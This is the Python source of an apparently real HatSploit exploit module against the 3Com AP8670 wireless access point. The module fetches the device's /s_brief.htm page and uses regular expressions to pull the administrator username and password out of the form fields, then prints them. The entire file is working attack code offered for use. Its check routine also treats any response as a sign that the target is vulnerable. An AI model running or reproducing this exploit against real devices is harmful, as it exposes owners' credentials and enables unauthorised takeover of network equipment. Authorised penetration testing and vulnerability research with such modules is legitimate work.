"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import re

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "exploit",
            'Name': "3Com AP8670 Disclosure",
            'Module': "exploit/linux/3com/ap8670_credentials_disclosure",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
                'Richard Brain - vulnerability researcher',
            ],
            'Description': "3Com AP8670 credentials disclosure exploit.",
            'Platform': "linux",
            'Rank': "high",
        }

        self.options = {
            'HOST': {
                'Description': "Remote host.",
                'Value': None,
                'Type': "ip",
                'Required': True,
            },
            'PORT': {
                'Description': "Remote port.",
                'Value': 8080,
                'Type': "port",
                'Required': True,
            },
        }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path='/s_brief.htm'
        )

        username = re.findall(
            '<input type="text" name="szUsername" size=16 value="(.+?)">', response.text
        )
        password = re.findall(
            '<input type="password" name="szPassword" size=16 maxlength="16" value="(.+?)">',
            response.text,
        )

        if username and password:
            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password)
            )
        else:
            self.print_warning("Target vulnerable, but no credentials found.")

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path='/s_brief.htm'
        )

        return bool(response or response.status_code == 200)

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.exploit(remote_host, remote_port)
